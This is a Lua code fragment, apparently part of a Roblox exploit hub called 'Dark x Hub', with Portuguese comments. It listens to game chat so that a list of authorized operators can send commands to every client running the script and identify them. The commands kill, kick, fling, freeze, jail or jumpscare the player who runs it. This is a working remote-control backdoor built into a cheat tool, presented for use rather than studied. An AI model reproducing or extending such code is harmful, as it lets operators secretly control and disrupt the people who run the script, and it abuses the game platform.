-- ====================================================================
-- SISTEMA DE EXECUÇÃO DE COMANDOS (RECEPÇÃO VIA CHAT)
-- ====================================================================
local function ProcessarComando(remetente, mensagem)
    if not AdminsAutorizados[remetente.Name] then return end
    if string.sub(mensagem, 1, 1) ~= ";" and string.sub(mensagem, 1, 1) ~= "/" then return end

    local args = string.split(string.sub(mensagem, 2), " ")
    local comando = string.lower(args[1] or "")
    local alvoNome = args[2]

    local myChar = LocalPlayer.Character
    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")

    local ehParaMim = false
    if alvoNome then
        alvoNome = string.lower(alvoNome)
        local meName = string.lower(LocalPlayer.Name)
        if alvoNome == "all" or alvoNome == meName or string.find(meName, alvoNome, 1, true) then
            ehParaMim = true
        end
    end

    -- Resposta da verificação
    if comando == "verifique" or comando == "verificar_drip_client" then
        EnviarMensagemChat(LocalPlayer.Name .. " [Dark x Hub Ativo]")
        return
    end

    -- Execução dos comandos no cliente alvo
    if ehParaMim then
        if comando == "kill" and myHum then
            myHum.Health = 0
        elseif comando == "kick" then
            LocalPlayer:Kick("Você foi expulso pelo painel de admin.")
        elseif comando == "bring" and myHRP and remetente.Character and remetente.Character:FindFirstChild("HumanoidRootPart") then
            myHRP.CFrame = remetente.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
        elseif comando == "fling" and myHRP then
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))
            bv.Parent = myHRP
            task.delay(0.5, function() if bv then bv:Destroy() end end)
        elseif comando == "jail" then
            CreateJail(LocalPlayer)
        elseif comando == "unjail" then
            RemoveJail(LocalPlayer)
        elseif comando == "freeze" then
            FreezePlayer(LocalPlayer)
        elseif comando == "unfreeze" then
            UnfreezePlayer(LocalPlayer)
        elseif comando == "explod" then
            Explode(LocalPlayer)
        elseif comando == "coolkidavatar" then
            CoolkidAvatar(LocalPlayer)
        elseif comando == "c00lkid" then
            Coolkid(LocalPlayer)
        elseif comando == "jumpscare" then
            Jumpscare(LocalPlayer)
        elseif comando == "messijumpscare" then
            MessiJumpscare(LocalPlayer)
        elseif comando == "backrooms" then
            Backrooms(LocalPlayer)
        end
    end
end

